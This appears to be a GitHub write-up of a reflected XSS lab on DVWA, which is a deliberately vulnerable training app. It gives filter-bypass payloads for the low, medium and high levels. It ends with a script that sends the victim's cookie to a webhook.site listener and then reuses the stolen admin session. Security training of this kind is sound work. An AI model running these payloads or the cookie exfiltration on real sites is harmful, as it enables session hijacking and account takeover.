# XSS-Reflected

![image](https://user-images.githubusercontent.com/106005322/218803765-43d31ef9-22fb-4c84-a7a2-a6dc84a261ad.png)
#
## What is Reflected-XSS?

#### XSS stands for Cross Site Scripting. This attack is a form of interference in the form of a code injection attack.

#### Reflected (Non-Persistent) XSS attacks occur when the malicious payload is included in the request sent to the vulnerable web application and is then reflected such that the server’s HTTP response consists of the payload. Attackers leverage social engineering techniques such as phishing attacks to make the victim include the malicious script in their request to the webserver. The victim’s browser then executes the malicious script as the HTTP response. 

#### Reflected XSS attacks are non-persistent such that each victim needs to send the request with a malicious payload. As a result, attackers tend to trick as many users as possible to succeed in the attack. Such attacks are often aimed at message forum form submissions, error messages, or search engine results pages, as it is easier to craft a malicious e-mail message that many users can click on. As one of the most common types of XSS attacks, reflected XSS does not require the attacker to locate and access a vulnerable web application that would allow them to inject malicious scripts permanently

#
#
## This is a Reflected-XSS simulation that i did on DVWA(Damn Vulnerable Web Application) from low to high stages
#
#

## Low

![Screenshot (21)](https://user-images.githubusercontent.com/106005322/218767063-3495683c-fb3f-4a10-85ab-9dc9b179c304.png)
#### so first of all I check the source code, in this source code I found that ```$_GET[ 'name' ]``` will print all the output that is filled in the variable ```$_GET```

#

![Screenshot (24)](https://user-images.githubusercontent.com/106005322/218767546-6ad92d61-b3a4-4a92-b7a7-76a619362593.png)
#### so now we know that we can inject the script into the text box, here I enter the js script ```<script>alert("Taming here")</script>``` and we can see that this page has a vulnerability to xss

#
#
## Medium

![Screenshot (22)](https://user-images.githubusercontent.com/106005322/218767232-38b9af68-67c4-4830-b459-34712abb23ac.png)
#### at this medium level I found there is ```str_replace( '<script>', '', $_GET[ 'name' ] );``` , the function of this code is to change case-sensitive words that are ```< script>``` to ```''``` , if we look at the source code this means if we enter the word ```<script>``` , the string will be deleted

#

![Screenshot (25)](https://user-images.githubusercontent.com/106005322/218767588-bc8e9378-4a8a-4e58-883e-15501b27a813.png)
#### so the solution is we just need to change any letter in ```<script>``` to uppercase, this is because ```str_replace``` only works on lowercase letters. now I will change ```<script>``` to ```<Script>```, so if I enter ```<Script>alert("Taming here")</script>``` it will show this page has xss vulnerability

#
#
## High

![Screenshot (23)](https://user-images.githubusercontent.com/106005322/218767295-0a1d024f-bdd2-4a74-8709-b92590f4b8fc.png)
#### at this high level we can see in the source code there is ```preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/ i' , '', $_GET[ 'name' ] );```, this ```preg_replace``` works to change the word that is ```'/<(.*)s(.*)c(.*)r(.* )i(.*)p(.*)t/i'``` to ```''``` which means it will be deleted. it doesn't matter whether the letter is lowercase or uppercase or even the one that matches the value in the ```preg_replace```. this means we cannot inject js code

#

![Screenshot (26)](https://user-images.githubusercontent.com/106005322/218767689-1fe43da0-8c6b-45f1-abdb-65d65208fc26.png)
#### so I tried to find a solution on the portswigger page, here I have understood that html tags that have an ```alert``` function can also be injected

#

![Screenshot (27)](https://user-images.githubusercontent.com/106005322/218767748-af21b5a2-07cf-4360-813b-7e5f8406b583.png)
#### now we can see that I have bypassed it by entering ```<image src/onerror=alert(1)>```


#
#
#

# Exploiting XSS-Reflected to steal cookies
#

![Screenshot (43)](https://user-images.githubusercontent.com/106005322/219379111-49619db5-d558-4e9b-9971-c72a30b8f39b.png)
#### first of all I will use a webhook as a listener to capture cookies, here I will use the following link and combine it with a js script which is ```<script>document.location='?c='+document.cookie;</script>``` + ```https:// webhook.site/3c1b2da1-3088-4793-8540-639634828977``` 
#

#### and it will look like this ```<script>document.location='https://webhook.site/3c1b2da1-3088-4793-8540-639634828977?c='+document.cookie;</script>```

#

![Screenshot (37)](https://user-images.githubusercontent.com/106005322/219379164-62072679-a516-4360-8e62-957b6afde612.png)
#### after that I will inject the script to the text box as an admin user on this dvwa, as you can see on the url it not only captures the cookie but it can also capture what level is used, but in a real situation this may require a phishing attack or social engineering
#

![Screenshot (40)](https://user-images.githubusercontent.com/106005322/219379204-6a952be4-74a8-4668-8d15-a71530ece2d9.png)
#### if I go back to the webhook website we can see I've got the admin's cookie
#

![Screenshot (45)](https://user-images.githubusercontent.com/106005322/219379253-25a5a634-8024-4373-9880-53425c217dc6.png)
#### lastly this cookie I can use to access as an admin where we know that if we log in as an admin we have features that are not available to normal users



